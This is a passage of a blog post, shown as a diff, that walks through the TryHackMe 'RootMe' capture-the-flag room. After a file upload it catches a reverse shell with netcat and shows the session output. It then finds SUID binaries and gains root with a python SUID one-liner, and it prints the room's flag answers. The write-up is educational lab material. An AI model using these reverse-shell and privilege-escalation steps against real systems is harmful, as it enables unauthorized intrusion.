+Try to upload the file again.</p>
+<a class="lightgallery" href="../panel2.png" title="home page" data-thumbnail="../panel2.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="../panel2.png"
+            data-srcset="../panel2.png, ../panel2.png 1.5x, ../panel2.png 2x"
+            data-sizes="auto"
+            alt="home page" />
+    </a>
+<p>Wooo file is successfully uploaded&hellip;<br>
+Now go to <code>http://$IP/uploads/</code></p>
+<a class="lightgallery" href="../uploads.png" title="home page" data-thumbnail="../uploads.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="../uploads.png"
+            data-srcset="../uploads.png, ../uploads.png 1.5x, ../uploads.png 2x"
+            data-sizes="auto"
+            alt="home page" />
+    </a>
+<p>file is uploaded.<br>
+now we use netcat tool to gain the access of reverse shell.</p>
+<h1 id="netcat">netcat</h1>
+<p>Run the following command.<br>
+command:<code>nc -lvnp 4444</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">sumit</span><span class="err">㉿</span><span class="n">mr</span><span class="o">-</span><span class="n">nob0dy</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">ctf</span><span class="o">/</span><span class="n">tryhackme</span><span class="o">/</span><span class="n">rootme</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4444</span>               
+</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">4444</span> <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.8.161.225</span><span class="p">]</span> <span class="nf">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10.156.27</span><span class="p">]</span> <span class="mi">38336</span>
+</span></span><span class="line"><span class="cl"><span class="n">Linux</span> <span class="n">rootme</span> <span class="mf">4.15.0</span><span class="o">-</span><span class="mi">112</span><span class="o">-</span><span class="n">generic</span> <span class="err">#</span><span class="mi">113</span><span class="o">-</span><span class="n">Ubuntu</span> <span class="n">SMP</span> <span class="n">Thu</span> <span class="n">Jul</span> <span class="mi">9</span> <span class="mi">23</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mi">39</span> <span class="n">UTC</span> <span class="mi">2020</span> <span class="n">x86_64</span> <span class="n">x86_64</span> <span class="n">x86_64</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">09</span><span class="o">:</span><span class="mi">08</span><span class="o">:</span><span class="mi">30</span> <span class="n">up</span>  <span class="mi">1</span><span class="o">:</span><span class="mi">31</span><span class="p">,</span>  <span class="mi">0</span> <span class="n">users</span><span class="p">,</span>  <span class="n">load</span> <span class="nl">average</span><span class="p">:</span> <span class="mf">0.00</span><span class="p">,</span> <span class="mf">0.00</span><span class="p">,</span> <span class="mf">0.00</span>
+</span></span><span class="line"><span class="cl"><span class="n">USER</span>     <span class="n">TTY</span>      <span class="n">FROM</span>             <span class="n">LOGIN</span><span class="err">@</span>   <span class="n">IDLE</span>   <span class="n">JCPU</span>   <span class="n">PCPU</span> <span class="n">WHAT</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nl">sh</span><span class="p">:</span> <span class="mi">0</span><span class="o">:</span> <span class="n">can</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">access</span> <span class="n">tty</span><span class="p">;</span> <span class="n">job</span> <span class="n">control</span> <span class="n">turned</span> <span class="n">off</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We get the shell access, now gothrough the all files and folders. try to find user.txt run the following command.<br>
+command:<code>find -type f -name user.txt</code></p>
+<a class="lightgallery" href="../flag1.png" title="home page" data-thumbnail="../flag1.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="../flag1.png"
+            data-srcset="../flag1.png, ../flag1.png 1.5x, ../flag1.png 2x"
+            data-sizes="auto"
+            alt="home page" />
+    </a>
+<p>Run:<br>
+command:<code>cd var/www</code><br>
+command:<code>ls</code><br>
+command:<code>cat user.txt</code></p>
+<p>We got our first flag.<br>
+Flag:<code>THM{y0u_g0t_a_sh3ll}</code></p>
+<h1 id="-task-4-privilege-escalation"># Task 4 Privilege escalation</h1>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Now that we have a shell, let&rsquo;s escalate our privileges to root.<br>
+From hint run the following command to search a file with SUID permission and we got the file with the name python.<br>
+command:<code>find / -user root -perm /4000</code></p>
+<p>We have a shell but it is not stable. From hint do some research on GTFOBins, Google it. Search for python in gtfobins go the SUID section we got the command.</p>
+<a class="lightgallery" href="../gtfobin.png" title="home page" data-thumbnail="../gtfobin.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="../gtfobin.png"
+            data-srcset="../gtfobin.png, ../gtfobin.png 1.5x, ../gtfobin.png 2x"
+            data-sizes="auto"
+            alt="home page" />
+    </a>
+<p>command:<code>python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'</code><br>
+command:<code>cd root</code><br>
+command:<code>ls</code><br>
+command:<code>cat root.txt</code></p>
+<p>By running the above command we get the root access or a stable shell now try to access <code>root.txt</code> file.
+we got our 2nd flag&hellip;.
+flag:<code>THM{pr1v1l3g3_3sc4l4t10n}</code></p>
+<h1 id="qna-2">QnA:</h1>
+<ol>
+<li>
+<p>Search for files with SUID permission, which file is weird?<br>
+<code>ans: /usr/bin/python</code></p>
+</li>
+<li>
+<p>Find a form to escalate your privileges.<br>
+<code>ans: no answer needed</code></p>
+</li>
+<li>
+<p>root.txt<br>
+<code>ans: THM{pr1v1l3g3_3sc4l4t10n}</code></p>
+</li>
+</ol>
+<h1 id="congrats-we-have-successfully-completed-the-room-hope-you-learnt-something-new">Congrats, we have successfully completed the room, hope you learnt something new&hellip;</h1>
+<p>Thanks for the reading&hellip;</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 28-09-2023</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/rootme/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://sumit2011.github.io/rootme/" data-title="RootMe &gt;_" data-via="_su__mit___"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sumit2011.github.io/rootme/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://sumit2011.github.io/rootme/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://sumit2011.github.io/rootme/" data-title="RootMe &gt;_" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/oops/" class="next" rel="next" title="Oops(object oriented programming)">Oops(object oriented programming)<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">sumit</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
